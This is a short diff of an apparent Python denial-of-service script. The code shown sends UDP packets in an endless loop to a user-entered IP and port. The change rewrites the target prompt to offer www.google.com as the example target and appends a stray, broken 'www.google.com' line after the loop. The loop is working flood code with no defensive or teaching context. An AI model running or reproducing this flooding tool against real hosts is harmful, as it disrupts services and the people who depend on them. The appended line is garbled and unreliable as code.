@@ -13,7 +13,7 @@ print("===========")
 time.sleep(4)
 os.system("clear")
 print()
-target = input(f"{green} Enter Target URL/IP: => ")
+target = input(f"{green} Target(www.google.com) URL/IP: => ")
 target.replace("http://", "")
 target.replace("https://","")
 target.replace("www.","")
@@ -37,3 +37,4 @@ while True:
      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      sock.sendto(bytes(joker,"UTF-8"), (ip,port))
      print(ip,"<== packet ==>",port)
+www.google.com
